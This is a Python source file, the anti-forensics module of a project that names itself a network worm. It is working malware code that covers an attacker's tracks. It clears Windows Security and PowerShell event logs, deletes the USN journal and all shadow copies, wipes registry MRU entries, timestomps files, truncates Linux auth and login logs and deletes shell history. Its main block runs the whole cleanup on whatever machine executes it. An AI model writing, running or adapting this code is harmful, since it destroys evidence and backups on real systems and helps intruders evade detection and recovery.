"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Anti-Forensics Module
Clean tracks and evade forensic analysis
"""


import os
import platform
import subprocess
import sys
from typing import Dict, List

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger


class AntiForensics:
    """
    Anti-Forensics Techniques

    Windows:
    - Event Log Clearing
    - Prefetch Cleaning
    - USN Journal Deletion
    - Shadow Copy Deletion
    - Registry Cleaning
    - Timestamp Stomping

    Linux:
    - Log Cleaning
    - History Clearing
    - Timestamp Modification

    Cross-platform:
    - Secure File Deletion
    - Memory Wiping
    """

    def __init__(self):
        self.os_type = platform.system()
        self.cleaned_artifacts = []

    def clean_all_tracks(self) -> Dict[str, bool]:
        """Clean all forensic artifacts"""
        logger.info("Starting anti-forensics cleanup")

        results = {}

        if self.os_type == "Windows":
            results["event_logs"] = self.clear_event_logs()
            results["prefetch"] = self.clear_prefetch()
            results["usn_journal"] = self.delete_usn_journal()
            results["shadow_copies"] = self.delete_shadow_copies()
            results["registry"] = self.clean_registry()

        elif self.os_type == "Linux":
            results["logs"] = self.clear_linux_logs()
            results["history"] = self.clear_history()

        # Cross-platform
        results["temp_files"] = self.clear_temp_files()

        successful = sum(1 for v in results.values() if v)
        logger.info(f"Anti-forensics: {successful}/{len(results)} successful")

        return results

    # ============ WINDOWS METHODS ============

    def clear_event_logs(self) -> bool:
        """Clear Windows Event Logs"""
        if self.os_type != "Windows":
            return False

        logger.info("Clearing Windows Event Logs")

        try:
            # Clear all event logs
            logs = [
                "Application",
                "Security",
                "System",
                "Windows PowerShell",
                "Microsoft-Windows-PowerShell/Operational",
            ]

            for log in logs:
                try:
                    subprocess.run(["wevtutil", "cl", log], capture_output=True, timeout=5)
                    logger.debug(f"Cleared {log}")
                except Exception:
                    pass

            self.cleaned_artifacts.append("Event_Logs")
            logger.success("Event logs cleared")
            return True

        except Exception as e:
            logger.error(f"Event log clearing failed: {e}")
            return False

    def clear_prefetch(self) -> bool:
        """Clear Prefetch files"""
        if self.os_type != "Windows":
            return False

        logger.info("Clearing Prefetch files")

        try:
            prefetch_path = "C:\\Windows\\Prefetch"

            if os.path.exists(prefetch_path):
                for file in os.listdir(prefetch_path):
                    try:
                        file_path = os.path.join(prefetch_path, file)
                        os.remove(file_path)
                    except Exception:
                        pass

                self.cleaned_artifacts.append("Prefetch")
                logger.success("Prefetch cleared")
                return True

            return False

        except Exception as e:
            logger.error(f"Prefetch clearing failed: {e}")
            return False

    def delete_usn_journal(self) -> bool:
        """Delete USN Journal"""
        if self.os_type != "Windows":
            return False

        logger.info("Deleting USN Journal")

        try:
            subprocess.run(
                ["fsutil", "usn", "deletejournal", "/D", "C:"], capture_output=True, timeout=10
            )

            self.cleaned_artifacts.append("USN_Journal")
            logger.success("USN Journal deleted")
            return True

        except Exception as e:
            logger.error(f"USN Journal deletion failed: {e}")
            return False

    def delete_shadow_copies(self) -> bool:
        """Delete Volume Shadow Copies"""
        if self.os_type != "Windows":
            return False

        logger.info("Deleting Shadow Copies")

        try:
            subprocess.run(
                ["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, timeout=30
            )

            self.cleaned_artifacts.append("Shadow_Copies")
            logger.success("Shadow copies deleted")
            return True

        except Exception as e:
            logger.error(f"Shadow copy deletion failed: {e}")
            return False

    def clean_registry(self) -> bool:
        """Clean registry artifacts"""
        if self.os_type != "Windows":
            return False

        logger.info("Cleaning registry artifacts")

        try:
            import winreg

            # Clean MRU (Most Recently Used) lists
            mru_keys = [
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
                r"Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
            ]

            for key_path in mru_keys:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
                    )

                    # Delete all values
                    i = 0
                    while True:
                        try:
                            value_name = winreg.EnumValue(key, i)[0]
                            winreg.DeleteValue(key, value_name)
                        except Exception:
                            break
                        i += 1

                    winreg.CloseKey(key)
                except Exception:
                    pass

            self.cleaned_artifacts.append("Registry")
            logger.success("Registry cleaned")
            return True

        except Exception as e:
            logger.error(f"Registry cleaning failed: {e}")
            return False

    def timestamp_stomp(self, file_path: str, reference_file: str = None) -> bool:
        """Modify file timestamps (timestomping)"""
        logger.info(f"Timestomping: {file_path}")

        try:
            if reference_file and os.path.exists(reference_file):
                # Copy timestamps from reference file
                ref_stat = os.stat(reference_file)
                os.utime(file_path, (ref_stat.st_atime, ref_stat.st_mtime))
            else:
                # Set to specific time (e.g., 2020-01-01)
                import time

                timestamp = time.mktime((2020, 1, 1, 0, 0, 0, 0, 0, 0))
                os.utime(file_path, (timestamp, timestamp))

            logger.success(f"Timestamp stomped: {file_path}")
            return True

        except Exception as e:
            logger.error(f"Timestamp stomping failed: {e}")
            return False

    # ============ LINUX METHODS ============

    def clear_linux_logs(self) -> bool:
        """Clear Linux log files"""
        if self.os_type != "Linux":
            return False

        logger.info("Clearing Linux logs")

        try:
            log_files = [
                "/var/log/auth.log",
                "/var/log/syslog",
                "/var/log/messages",
                "/var/log/secure",
                "/var/log/wtmp",
                "/var/log/btmp",
                "/var/log/lastlog",
            ]

            for log_file in log_files:
                if os.path.exists(log_file):
                    try:
                        # Truncate log file
                        with open(log_file, "w") as f:
                            f.write("")
                        logger.debug(f"Cleared {log_file}")
                    except Exception:
                        pass

            self.cleaned_artifacts.append("Linux_Logs")
            logger.success("Linux logs cleared")
            return True

        except Exception as e:
            logger.error(f"Linux log clearing failed: {e}")
            return False

    def clear_history(self) -> bool:
        """Clear command history"""
        if self.os_type != "Linux":
            return False

        logger.info("Clearing command history")

        try:
            history_files = [
                os.path.expanduser("~/.bash_history"),
                os.path.expanduser("~/.zsh_history"),
                os.path.expanduser("~/.python_history"),
                os.path.expanduser("~/.mysql_history"),
            ]

            for hist_file in history_files:
                if os.path.exists(hist_file):
                    try:
                        os.remove(hist_file)
                        logger.debug(f"Cleared {hist_file}")
                    except Exception:
                        pass

            # Unset HISTFILE
            os.environ["HISTFILE"] = "/dev/null"

            self.cleaned_artifacts.append("History")
            logger.success("Command history cleared")
            return True

        except Exception as e:
            logger.error(f"History clearing failed: {e}")
            return False

    # ============ CROSS-PLATFORM METHODS ============

    def clear_temp_files(self) -> bool:
        """Clear temporary files"""
        logger.info("Clearing temporary files")

        try:
            if self.os_type == "Windows":
                temp_paths = [os.getenv("TEMP"), os.getenv("TMP"), "C:\\Windows\\Temp"]
            else:
                temp_paths = ["/tmp", "/var/tmp"]

            for temp_path in temp_paths:
                if temp_path and os.path.exists(temp_path):
                    try:
                        for file in os.listdir(temp_path):
                            try:
                                file_path = os.path.join(temp_path, file)
                                if os.path.isfile(file_path):
                                    os.remove(file_path)
                            except Exception:
                                pass
                    except Exception:
                        pass

            self.cleaned_artifacts.append("Temp_Files")
            logger.success("Temp files cleared")
            return True

        except Exception as e:
            logger.error(f"Temp file clearing failed: {e}")
            return False

    def secure_delete(self, file_path: str, passes: int = 3) -> bool:
        """Securely delete file (multiple overwrites)"""
        logger.info(f"Securely deleting: {file_path}")

        try:
            if not os.path.exists(file_path):
                return False

            file_size = os.path.getsize(file_path)

            # Overwrite file multiple times
            with open(file_path, "wb") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())

            # Delete file
            os.remove(file_path)

            logger.success(f"Securely deleted: {file_path}")
            return True

        except Exception as e:
            logger.error(f"Secure deletion failed: {e}")
            return False

    def get_statistics(self) -> Dict:
        """Get anti-forensics statistics"""
        return {
            "os_type": self.os_type,
            "artifacts_cleaned": len(self.cleaned_artifacts),
            "cleaned_items": self.cleaned_artifacts,
        }


if __name__ == "__main__":
    # Test anti-forensics
    anti_forensics = AntiForensics()

    print("=" * 60)
    print("ANTI-FORENSICS MODULE TEST")
    print("=" * 60)

    print(f"\nOS: {anti_forensics.os_type}")

    print("\nCleaning forensic artifacts...")
    results = anti_forensics.clean_all_tracks()

    print("\nResults:")
    for artifact, success in results.items():
        status = "✓" if success else "✗"
        print(f"  {status} {artifact}")

    print("\nStatistics:")
    stats = anti_forensics.get_statistics()
    for key, value in stats.items():
        print(f"  {key}: {value}")

    print("=" * 60)
